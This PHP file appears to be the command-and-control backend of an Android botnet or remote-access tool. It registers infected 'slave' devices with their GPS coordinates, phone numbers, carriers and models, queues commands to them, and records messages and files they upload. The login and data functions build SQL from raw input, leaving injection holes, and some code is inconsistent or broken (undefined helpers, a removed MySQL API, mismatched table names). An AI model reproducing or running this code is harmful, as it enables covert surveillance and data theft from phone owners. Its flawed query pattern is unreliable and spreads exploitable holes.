<?php

  if (file_exists("config.php")) {
    include("config.php");
  } else {
    die();
  }
  
  try {
      $connect = new PDO("mysql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass);
      $connect->exec('set names utf8'); 
      $loginInfoRow = null;
  } catch (PDOException $e) {
    print "Error!: " . $e->getMessage() . "<br/>";
	die();
  }

  function user_access($uname, $pword){
      global $connect;
      global $loginInfoRow;
      $loginSql = "SELECT * FROM users WHERE username = '" .$uname."' AND password = '".$pword."'";
      $sm = $connect->prepare($loginSql);
      $sm->execute();
      $loginInfoRow = $sm->fetch(PDO::FETCH_ASSOC);
      if ($loginInfoRow != null) {
          return true;
      }else{
          return false;
      }
  }
  function user_config_init($supercode){
      global $loginInfoRow;
      if ($loginInfoRow != null) {
          // _SESSION["UserName"];
          // _SESSION["Password"];
          // _SESSION["PostBoxTextSize"];
          // _SESSION["DevicesTableRefreshSpeed"];
          // _SESSION["FilesTableRefreshSpeed"];
          // _SESSION["MessageBoxRefreshSpeed"];
          // _SESSION["OffLineMinutes"];
          // _SESSION["TimeZoneSetting"];
          // _SESSION["AutoScrollTextBox"];
          $_SESSION['UserName'] = $loginInfoRow['username'];
          $_SESSION['PostBoxTextSize'] = (int)$loginInfoRow['postboxtextsize'];
          $_SESSION['DevicesTableRefreshSpeed'] = (int)$loginInfoRow['devicestablerefreshspeed'];
          $_SESSION['FilesTableRefreshSpeed'] = (int)$loginInfoRow['filestablerefreshspeed'];
          $_SESSION['MessageBoxRefreshSpeed'] = (int)$loginInfoRow['messageboxrefreshspeed'];
          $_SESSION['OffLineMinutes'] = (int)$loginInfoRow['offlineminutes'];
          $_SESSION['TimeZoneSetting'] = $loginInfoRow['timezonesetting'];
          $_SESSION['AutoScrollTextBox'] = $loginInfoRow['autoscrolltextbox'];
      }
  }

function slave_exists($UID) {
	global $connect;
	$statement = $connect->prepare('SELECT * FROM bots WHERE uid=:uid');
	$statement->bindParam(':uid', $UID, PDO::PARAM_STR);
	$statement->execute();
	$row = $statement->fetch(PDO::FETCH_ASSOC);
	if(!$row){
	  return false;
	} else {
	  return true;
	}
}

function setFunction($UID, $Function){
	$UID = sanitize($UID);
	$Function = sanitize($Function);
	if(slave_exists($UID)){
		$functions = getFunction($UID);
		if($functions == ""){
			mysql_query("UPDATE slaves SET Function='$Function' WHERE `Unique_ID` = '$UID'") or die(mysql_error());
		} else {
			$functions = $functions . ", " . $Function;
			mysql_query("UPDATE slaves SET Function='$functions' WHERE `Unique_ID` = '$UID'") or die(mysql_error());
		}
	}
}

function updateSlave($UID, $Device, $Version, $Coordinates, $Provider, $PhoneNumber, $SDK, $Random){
  $remove = array("(", ")");
  $cleancoords = str_replace($remove, "", $Coordinates);
  $splitcoords = explode(",", $cleancoords);
  $Lati = $splitcoords[0];
  $Longi = $splitcoords[1];
  
  global $connect;
  
  if (slave_exists($UID)){
	$statement = $connect->prepare("UPDATE bots SET device='$Device', version='$Version', lati='$Lati', longi='$Longi', provider='$Provider', phone='$PhoneNumber', sdk='$SDK', random='$Random' WHERE `uid` = '$UID'");
	$statement->execute();
  } else {
    $statement = $connect->prepare("INSERT INTO `bots` (`uid`, `device`, `version`, `lati`, `longi`, `provider`, `phone`, `sdk`, `random`) VALUES ('$UID', '$Device', '$Version', '$Lati', '$Longi', '$Provider', '$PhoneNumber', '$SDK', '$Random')");
	$statement->execute();
  }
}

function addMessage($UID, $Message) {
  global $connect;
  $statement = $connect->prepare("INSERT INTO `messages` (`uid`, `message`) VALUES ('$UID', '$Message')");
  $statement->execute();
}

function addToUploads($owner, $slave, $file){
	if(slave_exists($slave)){
      if(file_exists("dlfiles/" . $file)){
	    global $connect;
        $statement = $connect->prepare("INSERT INTO `files` (`uid`, `file`) VALUES ('$slave', '$file')");
        $statement->execute();
      }
	}
}
?>
